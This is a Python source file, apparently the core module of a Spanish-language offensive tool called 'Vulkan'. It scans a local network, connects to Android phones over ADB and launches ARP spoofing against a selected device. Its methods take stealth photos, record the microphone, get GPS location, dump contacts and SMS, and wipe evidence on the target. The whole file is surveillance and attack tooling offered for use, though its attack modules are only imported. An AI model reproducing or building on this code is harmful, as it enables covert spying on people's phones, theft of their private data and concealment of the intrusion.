# core/vulkan_core.py - Núcleo principal
import threading
import time
import subprocess
import os
import sys
from utils.logger import Logger

try:
    from core.network_scanner import NetworkScanner
except ImportError:
    NetworkScanner = None

try:
    from core.adb_controller import ADBController
except ImportError:
    ADBController = None

try:
    from core.arp_spoofer import ARPSpoofer
except ImportError:
    ARPSpoofer = None

try:
    from tools.file_explorer import FileExplorer
except ImportError:
    FileExplorer = None

try:
    from tools.spy_tools import SpyTools
except ImportError:
    SpyTools = None


class VulkanCore:
    """Núcleo principal del sistema"""
    
    def __init__(self, root):
        self.root = root
        self.logger = Logger()
        
        self.network_scanner = None
        self.adb_controller = None
        self.arp_spoofer = None
        
        self.selected_device = None
        self.devices = []
        self.is_attacking = False
        self.scanning = False
        
        if NetworkScanner:
            self.network_scanner = NetworkScanner(self.logger)
            self.logger.log("✅ NetworkScanner inicializado", "GREEN")
        
        if ADBController:
            self.adb_controller = ADBController(self.logger)
            self.logger.log("✅ ADBController inicializado", "GREEN")
        
        if ARPSpoofer:
            self.arp_spoofer = ARPSpoofer(self.logger)
            self.logger.log("✅ ARPSpoofer inicializado", "GREEN")
    
    def scan_network(self, callback=None):
        """Escanear red"""
        if self.scanning:
            return
        
        self.scanning = True
        
        def scan_task():
            try:
                devices = []
                if self.network_scanner:
                    devices = self.network_scanner.scan_network()
                else:
                    devices = self.simple_network_scan()
                
                self.devices = devices
                if callback:
                    self.root.after(0, lambda: callback(devices))
                self.logger.log(f"✅ Escaneo completado: {len(devices)} dispositivos", "GREEN")
            except Exception as e:
                self.logger.log(f"❌ Error: {e}", "RED")
            finally:
                self.scanning = False
        
        threading.Thread(target=scan_task, daemon=True).start()
    
    def simple_network_scan(self):
        """Escaneo simple"""
        devices = []
        try:
            import socket
            import subprocess
            
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            ip_parts = local_ip.split('.')
            network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            for i in [1, 2, 5, 10, 20, 30, 50, 100, 150, 200, 250, 254]:
                ip = f"{network}.{i}"
                result = subprocess.run(["ping", "-n", "1", "-w", "300", ip], 
                                       capture_output=True, text=True, timeout=1)
                if "TTL=" in result.stdout.upper():
                    name = "⭐ MI PC" if ip == local_ip else f"📱 Device {i}"
                    devices.append({'ip': ip, 'mac': 'N/A', 'name': name, 'latency': '<10ms'})
        except:
            pass
        return devices
    
    def select_device(self, device):
        """Seleccionar dispositivo"""
        self.selected_device = device
        if self.adb_controller:
            def connect():
                self.adb_controller.connect_device(device['ip'])
            threading.Thread(target=connect, daemon=True).start()
        self.logger.log(f"🎯 Seleccionado: {device.get('name', 'Unknown')} ({device['ip']})", "CYAN")
    
    def get_installed_apps_async(self, callback):
        """Obtener apps async"""
        if not self.selected_device:
            callback([])
            return
        
        def get_apps():
            if SpyTools:
                spy = SpyTools(self.selected_device['ip'], self.logger)
                apps = spy.get_installed_apps()
                self.root.after(0, lambda: callback(apps))
            else:
                callback([])
        
        threading.Thread(target=get_apps, daemon=True).start()
    
    def view_screen(self):
        """Ver pantalla"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if not self.adb_controller:
            return "❌ ADB no disponible"
        return self.adb_controller.start_scrcpy(self.selected_device['ip'], self.selected_device.get('name', 'Device'))
    
    def open_camera(self):
        """Abrir cámara"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        return self.adb_controller.open_camera() if self.adb_controller else "❌ ADB no disponible"
    
    def record_video(self):
        """Grabar video"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        return self.adb_controller.start_video_record() if self.adb_controller else "❌ ADB no disponible"
    
    def send_notification(self, message):
        """Enviar notificación"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        return self.adb_controller.send_notification(message) if self.adb_controller else "❌ ADB no disponible"
    
    def open_webpage(self, url):
        """Abrir web"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        return self.adb_controller.open_url(url) if self.adb_controller else "❌ ADB no disponible"
    
    def execute_action(self, action):
        """Ejecutar acción"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if not self.adb_controller:
            return "❌ ADB no disponible"
        
        actions = {
            'home': 'input keyevent KEYCODE_HOME',
            'back': 'input keyevent KEYCODE_BACK',
            'volume_up': 'input keyevent KEYCODE_VOLUME_UP',
            'volume_down': 'input keyevent KEYCODE_VOLUME_DOWN',
        }
        
        if action in actions:
            return self.adb_controller.execute_shell(actions[action])
        return "❌ Acción desconocida"
    
    def start_arp_spoofing(self, target_ip=None):
        """Iniciar ARP spoofing real"""
        if not target_ip and self.selected_device:
            target_ip = self.selected_device.get('ip')
        
        if not target_ip:
            self.logger.log("❌ No hay dispositivo objetivo seleccionado", "RED")
            return False
        
        if not self.arp_spoofer:
            self.logger.log("❌ ARP Spoofer no disponible", "RED")
            return False
        
        self.logger.log(f"🔥 Iniciando ARP spoofing REAL contra {target_ip}", "RED")
        return self.arp_spoofer.start_attack(target_ip)
    
    def stop_arp_spoofing(self):
        """Detener ARP spoofing"""
        if self.arp_spoofer:
            self.arp_spoofer.stop_attack()
        self.is_attacking = False
    
    def block_device(self):
        """Bloquear dispositivo (usando ARP spoofing real)"""
        if not self.selected_device:
            self.logger.log("❌ No hay dispositivo seleccionado", "RED")
            return
        
        if self.selected_device.get('is_android', False):
            self.logger.log(f"🔒 Bloqueando {self.selected_device['name']} con ARP spoofing REAL...", "RED")
            self.start_arp_spoofing(self.selected_device['ip'])
            self.is_attacking = True
        else:
            self.logger.log(f"⚠️ {self.selected_device['name']} no es Android, bloqueo simulado", "YELLOW")
    
    def unblock_device(self):
        """Desbloquear dispositivo"""
        self.stop_arp_spoofing()
        self.logger.log(f"🔓 Dispositivo desbloqueado", "GREEN")
    
    def restore_all(self):
        """Restaurar todo"""
        self.stop_arp_spoofing()
        self.is_attacking = False
        self.logger.log("🛡️ Sistema restaurado", "GREEN")
    
    def stealth_photo(self):
        """Foto stealth"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if SpyTools:
            spy = SpyTools(self.selected_device['ip'], self.logger)
            return spy.take_stealth_photo()
        return "❌ No disponible"
    
    def record_mic(self, duration=30):
        """Grabar mic"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if SpyTools:
            spy = SpyTools(self.selected_device['ip'], self.logger)
            return spy.record_microphone(duration)
        return "❌ No disponible"
    
    def get_gps(self):
        """Obtener GPS"""
        if not self.selected_device:
            return None
        if SpyTools:
            spy = SpyTools(self.selected_device['ip'], self.logger)
            return spy.get_gps_location()
        return None
    
    def dump_contacts(self):
        """Extraer contactos"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if SpyTools:
            spy = SpyTools(self.selected_device['ip'], self.logger)
            return spy.dump_contacts()
        return "❌ No disponible"
    
    def dump_sms(self):
        """Extraer SMS"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if SpyTools:
            spy = SpyTools(self.selected_device['ip'], self.logger)
            return spy.dump_sms()
        return "❌ No disponible"
    
    def wipe_evidence(self):
        """Limpiar evidencia"""
        if not self.selected_device:
            return "❌ No hay dispositivo"
        if self.adb_controller:
            return self.adb_controller.wipe_evidence()
        return "❌ No disponible"